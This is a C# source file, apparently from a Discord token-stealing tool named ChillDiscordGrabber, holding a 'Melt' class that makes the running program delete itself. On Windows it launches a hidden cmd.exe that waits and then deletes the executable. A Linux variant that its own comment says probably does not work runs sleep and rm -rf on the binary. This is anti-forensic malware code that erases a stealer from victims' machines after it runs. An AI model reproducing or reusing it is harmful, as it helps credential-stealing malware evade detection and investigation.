using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ChillDiscordGrabber
{
    class Melt
    {
        //Deletes the file on windows
        public static void Windows()
        {
            Process.Start(new ProcessStartInfo()
            {
                Arguments = $"/C choice /C Y /N /D Y /T {Settings.SeondsToMeltIn} & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
            Environment.Exit(0);
        }

        //To be tested, probably doesnt work tho
        public static void Linux()
        {
            Process.Start(new ProcessStartInfo
            { 
                FileName = "",
                CreateNoWindow = true,
                Arguments = $"sleep {Settings.SeondsToMeltIn} && rm -rf {Process.GetCurrentProcess().MainModule.FileName}"
            });
            Environment.Exit(0);
        }
    }
}
